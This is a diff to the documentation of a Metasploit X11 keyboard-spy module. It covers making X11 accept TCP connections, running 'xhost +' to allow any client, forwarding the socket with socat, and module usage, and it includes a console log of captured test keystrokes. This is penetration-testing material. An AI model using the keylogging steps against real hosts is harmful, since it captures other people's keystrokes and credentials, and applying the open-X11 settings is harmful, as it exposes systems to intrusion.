@@ -8,30 +8,32 @@ window, binding a keyboard to it and creating a notification alert when a key
 is pressed.
 
 One of the major limitations of xspy, and thus this module, is that it polls
-at a very fast rate. Faster than a key being pressed is released (especially before
+at a very fast rate, faster than a key being pressed is released (especially before
 the repeat delay is hit). To combat printing multiple characters for a single key
-press, repeat characters are ignored.
+press, repeat characters arent printed when typed in a very fast manor. This is also
+an imperfect keylogger in that keystrokes arent stored and forwarded but status
+displayed at poll time. Keys may be repeated or missing.
 
 ### Ubuntu 10.04
 
 1. `sudo nano /etc/gdm/gdm.schemas`
 2. Find:
 
-    ```
-    <schema>
-     <key>security/DisallowTCP</key>
-     <signature>b</signature>
-     <default>true</default>
-    </schema>
-    ```
-  - Change `true` to `false`
+```
+<schema>
+    <key>security/DisallowTCP</key>
+    <signature>b</signature>
+    <default>true</default>
+</schema>
+```
+- Change `true` to `false`
 
 3. logout or reboot
-4. Verification: ```sudo netstat -antp | grep 6000```
+4. Verification: `sudo netstat -antp | grep 6000`
 
-    ```
-    tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      1806/X
-    ```
+```
+tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      1806/X
+```
 
 5. Now, to verify you allow ANYONE to get on X11, type: `xhost +`
 
@@ -40,17 +42,17 @@ press, repeat characters are ignored.
 1. `sudo nano /etc/lightdm/lightdm.conf`
 2. Under the `[SeatDefaults]` area, add:
 
-    ```
-    xserver-allow-tcp=true
-    allow-guest=true
-    ```
+```
+xserver-allow-tcp=true
+allow-guest=true
+```
 
 3. logout or reboot
-4. Verification: ```sudo netstat -antp | grep 6000```
+4. Verification: `sudo netstat -antp | grep 6000`
 
-    ```        
-    tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      1806/X
-    ```
+```
+tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      1806/X
+```
 
 5. Now, to verify you allow ANYONE to get on X11, type: `xhost +`
 
@@ -63,9 +65,9 @@ press, repeat characters are ignored.
 1. `vi /etc/gdm/custom.conf`
 2. Under the `[security]` area, add:
 
-    ```
-    DisallowTCP=false
-    ```
+```
+DisallowTCP=false
+```
 
 3. logout/reboot
 4. Now, to verify you allow ANYONE to get on X11, type: `xhost +`
@@ -86,43 +88,112 @@ Getting X11 to listen on a TCP port is rather taxing, so we use socat to facilit
 1. `sudo apt-get install ubuntu-desktop socat` # overkill but it gets everything we need
 2. `sudo reboot` # prob a good idea since so much was installed
 3. `sudo xhost +` # must be done through gui, not through SSH
-4. `socat -d -d TCP-LISTEN:6000,fork,bind=<IP to listen to here> UNIX-CONNECT:/tmp/.X11-unix/X0`
+4. `socat -d -d TCP-LISTEN:6000,fork,bind=<IP to listen to here> UNIX-CONNECT:/tmp/.X11-unix/X0`, you may need to
+use `X1` instead of `X0` depending on context.
 
 ## Verification Steps
-Example steps in this format (is also in the PR):
 
-1. Install the application
+1. Configure X11 to listen on port 6000, or use `socat` to open a socket.
 1. Start msfconsole
-1. Do: `use [module path]`
+1. Do: `use auxiliary/gather/x11_keyboard_spy`
+1. Do: `set rhosts [IP]`
 1. Do: `run`
-1. You should get a shell.
+1. You should print keystrokes as they're pressed
 
 ## Options
-List each option and how to use it.
 
-### Option Name
+### ListenerTimeout
 
-Talk about what it does, and how to use it appropriately. If the default value is likely to change, include the default value here.
+How many seconds to keylog for.
+If set to `0`, wait forever. Defaults to `600`, 10 minutes.
 
 ## Scenarios
-Specific demo of using the module that might be useful in a real world scenario.
 
-### Version and OS
-
-```
-code or console output
-```
-
-For example:
-
-To do this specific thing, here's how you do it:
+### Ubuntu 22.04
 
 ```
-msf > use module_name
-msf auxiliary(module_name) > set POWERLEVEL >9000
-msf auxiliary(module_name) > exploit
+[*] Processing xspy.rb for ERB directives.
+resource (xspy.rb)> use auxiliary/gather/x11_keyboard_spy
+resource (xspy.rb)> set verbose true
+verbose => true
+resource (xspy.rb)> set rhosts 127.0.0.1
+rhosts => 127.0.0.1
+msf6 auxiliary(gather/x11_keyboard_spy) > run
+[*] Running module against 127.0.0.1
+
+[*] 127.0.0.1:6000 - Establishing TCP Connection
+[*] 127.0.0.1:6000 - (1/9) Establishing X11 connection
+[-] 127.0.0.1:6000 - Connection packet malfored (size: 8192), attempting to get read more data
+[+] 127.0.0.1:6000 - Successly established X11 connection
+[*] 127.0.0.1:6000 - Version: 11.0
+[*] 127.0.0.1:6000 - Screen Resolution: 958x832
+[*] 127.0.0.1:6000 - Resource ID: 33554432
+[*] 127.0.0.1:6000 - Screen root: 1320
+[*] 127.0.0.1:6000 - (2/9) Checking on BIG-REQUESTS extension
+[+] 127.0.0.1:6000 -   Extension BIG-REQUESTS is present with id 134
+[*] 127.0.0.1:6000 - (3/9) Enabling BIG-REQUESTS
+[*] 127.0.0.1:6000 - (4/9) Creating new graphical context
+[*] 127.0.0.1:6000 - (5/9) Checking on XKEYBOARD extension
+[+] 127.0.0.1:6000 -   Extension XKEYBOARD is present with id 136
+[*] 127.0.0.1:6000 - (6/9) Enabling XKEYBOARD
+[*] 127.0.0.1:6000 - (7/9) Requesting XKEYBOARD map
+[*] 127.0.0.1:6000 - (8/9) Enabling notification on keyboard and map
+[*] 127.0.0.1:6000 - (9/9) Creating local keyboard map
+[+] 127.0.0.1:6000 - All setup, watching for keystrokes
+t
+e
+[space]
+q
+u
+u
+i
+c
+k
+[space]
+r
+o
+w
+n
+[space]
+f
+o
+x
+m
+p
+s
+[space]
+o
+v
+e
+e
+r
+r
+[space]
+t
+h
+e
+[space]
+l
+a
+z
+y
+[space]
+d
+o
+^C[*] 127.0.0.1:6000 - Closing X11 connection
+[+] 127.0.0.1:6000 - Logged keys stored to: /root/.msf4/loot/20240226150211_default_127.0.0.1_x11.keylogger_839830.txt
+[-] 127.0.0.1:6000 - Stopping running against current target...
+[*] 127.0.0.1:6000 - Control-C again to force quit all targets.
+[*] Auxiliary module execution completed
 ```
 
 ## Confirming
 
 To keylog the remote host, we use a tool called [xspy](http://tools.kali.org/sniffingspoofing/xspy)
+
+The output will be very similar to the metasploit module, but may differ. Compare the below two entries (spaces added to xspy for alignment):
+
+```
+xspy: the      quck         rown       foxumps      over         the       lazy      do
+msf:  te[space]quuick[space]rown[space]foxmps[space]oveerr[space]the[space]lazy[space]do
+```
